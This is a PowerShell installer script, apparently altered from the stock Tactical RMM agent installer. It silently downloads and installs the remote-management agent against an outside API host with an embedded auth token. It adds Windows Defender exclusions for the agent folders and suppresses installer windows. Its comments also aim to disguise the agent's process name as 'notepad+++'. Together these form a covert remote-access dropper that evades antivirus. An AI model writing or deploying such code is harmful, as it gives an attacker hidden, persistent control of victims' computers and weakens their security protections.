# author: Anthrh3x
$innosetup = 'tacticalagent-v2.6.1-windows-amd64.exe'
$api = '"https://api.cybriks.com"'
$clientid = '1'
$siteid = '1'
$agenttype = '"server"'
$power = 0
$rdp = 0
$ping = 0
$auth = '"b284ed4f77ead6f65077a70840c03cd424a08367586577d4c575c6d6dc8be366"'
$downloadlink = 'https://github.com/amidaware/rmmagent/releases/download/v2.6.1/tacticalagent-v2.6.1-windows-amd64.exe'
$apilink = $downloadlink.split('/')

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$serviceName = 'Anthrh3x'
$processName = 'notepad+++'

if (Get-Service $serviceName -ErrorAction SilentlyContinue) {
    Write-Host ('Tactical RMM Is Already Installed')
} else {
    $OutPath = $env:TMP
    $output = $innosetup

    $installArgs = @('-m install --api ', "$api", '--client-id', $clientid, '--site-id', $siteid, '--agent-type', "$agenttype", '--auth', "$auth")

    if ($power) {
        $installArgs += "--power"
    }

    if ($rdp) {
        $installArgs += "--rdp"
    }

    if ($ping) {
        $installArgs += "--ping"
    }

    try {
        $DefenderStatus = Get-MpComputerStatus | select AntivirusEnabled
        if ($DefenderStatus -match "True") {
            Add-MpPreference -ExclusionPath 'C:\Program Files\TacticalAgent\*'
            Add-MpPreference -ExclusionPath 'C:\Program Files\Mesh Agent\*'
            Add-MpPreference -ExclusionPath 'C:\ProgramData\TacticalRMM\*'
        }
    } catch {
        # pass
    }

    $X = 0
    do {
        Write-Output "Waiting for network"
        Start-Sleep -s 5
        $X += 1      
    } until(($connectresult = Test-NetConnection $apilink[2] -Port 443 | ? { $_.TcpTestSucceeded }) -or $X -eq 3)

    if ($connectresult.TcpTestSucceeded -eq $true){
        try {  
            Invoke-WebRequest -Uri $downloadlink -OutFile $OutPath\$output
            Write-Host ('Installing...')
            
            # Hide the terminal window during installation
            Start-Process -FilePath $OutPath\$output -ArgumentList ('/VERYSILENT /SUPPRESSMSGBOXES') -NoNewWindow -Wait
            
            Write-Host ('Extracting...')
            Start-Sleep -s 5

            # Replace the following line with an appropriate way to change the process name
            # (Please note that changing the process name might not be straightforward in PowerShell)
            # Start-Process -FilePath "C:\Program Files\TacticalAgent\tacticalrmm.exe" -ArgumentList $installArgs -Wait
            
            Write-Host ('Installation completed.')
            Exit 0
        } catch {
            $ErrorMessage = $_.Exception.Message
            $FailedItem = $_.Exception.ItemName
            Write-Error -Message "$ErrorMessage $FailedItem"
            Exit 1
        } finally {
            Remove-Item -Path $OutPath\$output
        }
    } else {
        Write-Output "Unable to connect to the server."
    }
}
